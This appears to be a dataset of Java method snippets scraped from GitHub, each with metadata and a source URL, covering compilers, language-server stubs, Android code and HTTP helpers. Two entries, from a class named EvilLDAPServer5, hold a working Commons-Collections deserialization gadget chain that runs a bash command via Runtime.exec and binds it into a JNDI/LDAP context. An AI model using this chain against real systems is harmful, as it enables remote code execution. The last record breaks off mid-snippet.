super.generateCode();\n\t\tswitch (expr.getType().getTypeCode()) {\n\t\tcase POINTER:\n\t\t\tresult += tab() + \"free(\" + expr.generateCode() + \");\" + NL;\n\t\t\tresult += tab() + expr.generateCode() + \" = 0;\" + NL;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tthrow new CodeException(\"dispose\");\n\t\t\n\t\t}\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmDISPOSE.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public"]}}, {"id": 30125, "method_name": "checkType", "class_name": "StmDISPOSE", "params": [], "throws": ["TypeException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void checkType() throws TypeException {\n\t\texpr.checkType();\n\t\texpr.getType().assertType(this, TypeCode.POINTER);\n\t\texpr.checkType();\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmDISPOSE.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public"]}}, {"id": 30126, "method_name": "toString", "class_name": "StmDISPOSE", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\treturn \"dispose \" + expr;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmDISPOSE.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public"]}}, {"id": 30127, "method_name": "getObject", "class_name": "EvilLDAPServer5", "params": ["String"], "throws": ["Exception"], "modifiers": ["private", "static"], "return_type": "Object", "snippet": "    private static Object getObject ( String cmd ) throws Exception\n    {\n        Transformer[]   tarray      = new Transformer[]\n        {\n            new ConstantTransformer( Runtime.class ),\n            new InvokerTransformer\n            (\n                \"getMethod\",\n                new Class[]\n                {\n                    String.class,\n                    Class[].class\n                },\n                new Object[]\n                {\n                    \"getRuntime\",\n                    new Class[0]\n                }\n            ),\n            new InvokerTransformer\n            (\n                \"invoke\",\n                new Class[]\n                {\n                    Object.class,\n                    Object[].class\n                },\n                new Object[]\n                {\n                    null,\n                    new Object[0]\n                }\n            ),\n            new InvokerTransformer\n            (\n                \"exec\",\n                new Class[]\n                {\n                    String[].class\n                },\n                new Object[]\n                {\n                    new String[]\n                    {\n                        \"/bin/bash\",\n                        \"-c\",\n                        cmd\n                    }\n                }\n            )\n        };\n        Transformer     tchain      = new ChainedTransformer( new Transformer[0] );\n        Map             normalMap_0 = new HashMap();\n        Map             normalMap_1 = new HashMap();\n        Map             lazyMap_0   = LazyMap.decorate( normalMap_0, tchain );\n        Map             lazyMap_1   = LazyMap.decorate( normalMap_1, tchain );\n        lazyMap_0.put( \"scz\", \"same\" );\n        lazyMap_1.put( \"tDz\", \"same\" );\n        Hashtable       ht          = new Hashtable();\n        ht.put( lazyMap_0, \"value_0\" );\n        ht.put( lazyMap_1, \"value_1\" );\n        lazyMap_1.remove( \"scz\" );\n        Field           f           = ChainedTransformer.class.getDeclaredField( \"iTransformers\" );\n        f.setAccessible( true );\n        f.set( tchain, tarray );\n        return( ht );\n    }", "url": "https://raw.githubusercontent.com/shadowsock5/JDNI-Bypass-JDK-By-LDAP/master/test1/EvilLDAPServer5.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30128, "method_name": "main", "class_name": "EvilLDAPServer5", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main ( String[] argv ) throws Exception\n    {\n        String  name    = argv[0];\n        String  cmd     = argv[1];\n        Object  obj     = getObject( cmd );\n        Context ctx     = new InitialContext();\n        ctx.rebind( name, obj );\n        System.in.read();\n    }", "url": "https://raw.githubusercontent.com/shadowsock5/JDNI-Bypass-JDK-By-LDAP/master/test1/EvilLDAPServer5.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30129, "method_name": "completion", "class_name": "FullTextDocumentService", "params": ["CompletionParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<Either>", "snippet": "  public CompletableFuture<Either<List<CompletionItem>, CompletionList>> completion(CompletionParams position) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30130, "method_name": "resolveCompletionItem", "class_name": "FullTextDocumentService", "params": ["CompletionItem"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<CompletionItem>", "snippet": "  public CompletableFuture<CompletionItem> resolveCompletionItem(CompletionItem unresolved) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30131, "method_name": "hover", "class_name": "FullTextDocumentService", "params": ["HoverParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<Hover>", "snippet": "  public CompletableFuture<Hover> hover(HoverParams position) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30132, "method_name": "signatureHelp", "class_name": "FullTextDocumentService", "params": ["SignatureHelpParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<SignatureHelp>", "snippet": "  public CompletableFuture<SignatureHelp> signatureHelp(SignatureHelpParams position) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30133, "method_name": "definition", "class_name": "FullTextDocumentService", "params": ["DefinitionParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<Either>", "snippet": "  public CompletableFuture<Either<List<? extends Location>,List<? extends LocationLink>>> definition(DefinitionParams position) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30134, "method_name": "references", "class_name": "FullTextDocumentService", "params": ["ReferenceParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<? extends Location>> references(ReferenceParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30135, "method_name": "documentHighlight", "class_name": "FullTextDocumentService", "params": ["DocumentHighlightParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<? extends DocumentHighlight>> documentHighlight(DocumentHighlightParams position) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30136, "method_name": "documentSymbol", "class_name": "FullTextDocumentService", "params": ["DocumentSymbolParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<Either<SymbolInformation, DocumentSymbol>>> documentSymbol(DocumentSymbolParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30137, "method_name": "codeAction", "class_name": "FullTextDocumentService", "params": ["CodeActionParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<Either<Command, CodeAction>>> codeAction(CodeActionParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30138, "method_name": "codeLens", "class_name": "FullTextDocumentService", "params": ["CodeLensParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<? extends CodeLens>> codeLens(CodeLensParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30139, "method_name": "resolveCodeLens", "class_name": "FullTextDocumentService", "params": ["CodeLens"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<CodeLens>", "snippet": "  public CompletableFuture<CodeLens> resolveCodeLens(CodeLens unresolved) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30140, "method_name": "formatting", "class_name": "FullTextDocumentService", "params": ["DocumentFormattingParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<? extends TextEdit>> formatting(DocumentFormattingParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30141, "method_name": "rangeFormatting", "class_name": "FullTextDocumentService", "params": ["DocumentRangeFormattingParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<? extends TextEdit>> rangeFormatting(DocumentRangeFormattingParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30142, "method_name": "onTypeFormatting", "class_name": "FullTextDocumentService", "params": ["DocumentOnTypeFormattingParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<? extends TextEdit>> onTypeFormatting(DocumentOnTypeFormattingParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30143, "method_name": "rename", "class_name": "FullTextDocumentService", "params": ["RenameParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<WorkspaceEdit>", "snippet": "  public CompletableFuture<WorkspaceEdit> rename(RenameParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30144, "method_name": "didOpen", "class_name": "FullTextDocumentService", "params": ["DidOpenTextDocumentParams"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void didOpen(DidOpenTextDocumentParams params) {\n    documents.put(params.getTextDocument().getUri(), params.getTextDocument());\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30145, "method_name": "didChange", "class_name": "FullTextDocumentService", "params": ["DidChangeTextDocumentParams"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void didChange(DidChangeTextDocumentParams params) {\n    String uri = params.getTextDocument().getUri();\n    for (TextDocumentContentChangeEvent changeEvent : params.getContentChanges()) {\n      // Will be full update because we specified that is all we support\n      if (changeEvent.getRange() != null) {\n        throw new UnsupportedOperationException(Tools.i18n(\"rangeShouldBeNull\"));\n      }\n\n      documents.get(uri).setText(changeEvent.getText());\n      documents.get(uri).setVersion(params.getTextDocument().getVersion());\n    }\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30146, "method_name": "didClose", "class_name": "FullTextDocumentService", "params": ["DidCloseTextDocumentParams"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void didClose(DidCloseTextDocumentParams params) {\n    String uri = params.getTextDocument().getUri();\n    documents.remove(uri);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30147, "method_name": "didSave", "class_name": "FullTextDocumentService", "params": ["DidSaveTextDocumentParams"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void didSave(DidSaveTextDocumentParams params) {\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 30148, "method_name": "convertTo", "class_name": "UUIDConverter", "params": ["UUID", "ConversionInfo"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String convertTo(UUID uuid, ConversionInfo conversionInfo) {\n        return uuid.toString();\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/converter/UUIDConverter.java", "stars": "3", "class_props": {"extends": null, "implements": ["Converter"], "modifiers": ["final", "public"]}}, {"id": 30149, "method_name": "convertFrom", "class_name": "UUIDConverter", "params": ["String", "ConversionInfo"], "throws": null, "modifiers": ["public"], "return_type": "UUID", "snippet": "    public UUID convertFrom(String s, ConversionInfo conversionInfo) {\n        return UUID.fromString(s);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/converter/UUIDConverter.java", "stars": "3", "class_props": {"extends": null, "implements": ["Converter"], "modifiers": ["final", "public"]}}, {"id": 30150, "method_name": "newInstance", "class_name": "TransactionsFragment", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "TransactionsFragment", "snippet": "    public static TransactionsFragment newInstance() {\n        return new TransactionsFragment();\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/TransactionsFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 30151, "method_name": "onCreateView", "class_name": "TransactionsFragment", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {\n        View v = inflater.inflate(R.layout.fragment_transactions, container, false);\n\n        mydb = new DBHelper(getActivity());\n        ArrayList array_list = mydb.getAllTransactions();\n\n        ArrayList<HashMap<String, String>> transList = new ArrayList<HashMap<String, String>>();\n        for (int i=0;i<array_list.size();i+=3)\n        {\n            HashMap<String, String> map = new HashMap <String, String>();\n            map.put(KEY_SENDER, array_list.get(i).toString());\n            map.put(KEY_RECEIVER, array_list.get(i+1).toString());\n            map.put(KEY_AMOUNT, array_list.get(i+2).toString());\n            transList.add(map);\n        }\n\n        Collections.reverse(transList);\n        list=(ListView)v.findViewById(R.id.listView1);\n\n        // Getting adapter by passing xml data ArrayList\n        adapter=new MyAdapter(getActivity(), transList);\n        list.setAdapter(adapter);\n\n        return v;\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/TransactionsFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 30152, "method_name": "install", "class_name": "IgnoreHostProxySelector", "params": ["String", "int"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void install(String hostToIgnore, int portToIgnore) {\n        ProxySelector defaultProxySelector = ProxySelector.getDefault();\n        ProxySelector ignoreHostProxySelector = new IgnoreHostProxySelector(defaultProxySelector, hostToIgnore, portToIgnore);\n        ProxySelector.setDefault(ignoreHostProxySelector);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/IgnoreHostProxySelector.java", "stars": "2", "class_props": {"extends": "ProxySelector", "implements": null, "modifiers": []}}, {"id": 30153, "method_name": "select", "class_name": "IgnoreHostProxySelector", "params": ["URI"], "throws": null, "modifiers": ["public"], "return_type": "List<Proxy>", "snippet": "    public List<Proxy> select(URI uri) {\n        boolean ignored = hostToIgnore.equals(uri.getHost()) && portToIgnore == uri.getPort();\n        return ignored ? NO_PROXY_LIST : defaultProxySelector.select(uri);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/IgnoreHostProxySelector.java", "stars": "2", "class_props": {"extends": "ProxySelector", "implements": null, "modifiers": []}}, {"id": 30154, "method_name": "connectFailed", "class_name": "IgnoreHostProxySelector", "params": ["URI", "SocketAddress", "IOException"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void connectFailed(URI uri, SocketAddress address, IOException failure) {\n        defaultProxySelector.connectFailed(uri, address, failure);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/IgnoreHostProxySelector.java", "stars": "2", "class_props": {"extends": "ProxySelector", "implements": null, "modifiers": []}}, {"id": 30155, "method_name": "test", "class_name": "Member", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test(final int param){\n        final String str = \"hello\";\n        class Inner {\n            public void innerMethod(){\n                System.out.println(\"Member a\" + a);\n                System.out.println(\"param \" + param);\n                System.out.println(\"str \" + str);\n            }\n        }\n        Inner inner = new Inner();\n        inner.innerMethod();\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/javaMind/neibulei/Member.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30156, "method_name": "main", "class_name": "Member", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        Member member = new Member();\n        member.test(100);\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/javaMind/neibulei/Member.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30157, "method_name": "innerMethod", "class_name": "Inner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void innerMethod(){\n                System.out.println(\"Member a\" + a);\n                System.out.println(\"param \" + param);\n                System.out.println(\"str \" + str);\n            }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/javaMind/neibulei/Member.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30158, "method_name": "onCreateViewHolder", "class_name": "notification_adapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "notification_adapter", "snippet": "    public notification_adapter.notiholder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {\n        return new notiholder(LayoutInflater.from(app).inflate(R.layout.onenotification,parent,false));\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/notification_adapter.java", "stars": "2", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 30159, "method_name": "onBindViewHolder", "class_name": "notification_adapter", "params": ["notification_adapter", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(@NonNull notification_adapter.notiholder holder, int position) {\n        notification_data obj = data.get(position);\n        holder.t2.setText(obj.getRemark());\n        holder.t1.setText(obj.getFrom().toUpperCase()+\" REQUESTED \"+obj.getMsg());\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/notification_adapter.java", "stars": "2", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 30160, "method_name": "getItemCount", "class_name": "notification_adapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {\n        return data.size();\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/notification_adapter.java", "stars": "2", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 30161, "method_name": "newInstance", "class_name": "HttpConnection", "params": ["URI"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "HttpConnection", "snippet": "    public static HttpConnection newInstance(URI uri) throws IOException {\n        return new HttpURLConnectionClient(uri);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30162, "method_name": "newSubscriptionInstance", "class_name": "HttpConnection", "params": ["URI"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "HttpConnection", "snippet": "    public static HttpConnection newSubscriptionInstance(URI uri) throws IOException {\n        return new CustomConnectionClient(uri);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30163, "method_name": "setMethod", "class_name": "HttpConnection", "params": ["Method"], "throws": ["ProtocolException"], "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void setMethod(Method method) throws ProtocolException;\n\n    public abstract int getResponseCode() throws IOException;\n\n    public abstract String getResponseString() throws IOException;\n\n    public abstract void execute() throws IOException;\n\n    public abstract void setPayload(String payload);\n\n    public abstract void setPayload(byte[] payload);\n\n    public abstract void setHeader(String name, String value);\n\n    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30164, "method_name": "getResponseCode", "class_name": "HttpConnection", "params": [], "throws": ["IOException"], "modifiers": ["public", "abstract"], "return_type": "int", "snippet": "    public abstract int getResponseCode() throws IOException;\n\n    public abstract String getResponseString() throws IOException;\n\n    public abstract void execute() throws IOException;\n\n    public abstract void setPayload(String payload);\n\n    public abstract void setPayload(byte[] payload);\n\n    public abstract void setHeader(String name, String value);\n\n    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30165, "method_name": "getResponseString", "class_name": "HttpConnection", "params": [], "throws": ["IOException"], "modifiers": ["public", "abstract"], "return_type": "String", "snippet": "    public abstract String getResponseString() throws IOException;\n\n    public abstract void execute() throws IOException;\n\n    public abstract void setPayload(String payload);\n\n    public abstract void setPayload(byte[] payload);\n\n    public abstract void setHeader(String name, String value);\n\n    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30166, "method_name": "execute", "class_name": "HttpConnection", "params": [], "throws": ["IOException"], "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void execute() throws IOException;\n\n    public abstract void setPayload(String payload);\n\n    public abstract void setPayload(byte[] payload);\n\n    public abstract void setHeader(String name, String value);\n\n    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30167, "method_name": "setPayload", "class_name": "HttpConnection", "params": ["String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void setPayload(String payload);\n\n    public abstract void setPayload(byte[] payload);\n\n    public abstract void setHeader(String name, String value);\n\n    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30168, "method_name": "setPayload", "class_name": "HttpConnection", "params": ["byte"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void setPayload(byte[] payload);\n\n    public abstract void setHeader(String name, String value);\n\n    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30169, "method_name": "setHeader", "class_name": "HttpConnection", "params": ["String", "String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void setHeader(String name, String value);\n\n    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30170, "method_name": "getResponseHeader", "class_name": "HttpConnection", "params": ["String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "String", "snippet": "    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 30171, "method_name": "setMethod", "class_name": "HttpURLConnectionClient", "params": ["Method"], "throws": ["ProtocolException"], "modifiers": ["public"], "return_type": "void", "snippet": "        public void setMethod(Method method) throws ProtocolException {\n            connection.setRequestMethod(method.name());\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30172, "method_name": "getResponseCode", "class_name": "HttpURLConnectionClient", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "int", "snippet": "        public int getResponseCode() throws IOException {\n            return responseCode;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30173, "method_name": "getResponseString", "class_name": "HttpURLConnectionClient", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "String", "snippet": "        public String getResponseString() throws IOException {\n            return response;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["private", "static"]}}, {"id": 30174, "method_name": "execute", "class_name": "HttpURLConnectionClient", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "        public void execute() throws IOException {\n            try {\n                if (payload != null) {\n                    BufferedOutputStream writer =\n                            new BufferedOutputStream(connection.getOutputStream());\n                    writer.write(payload);\n                    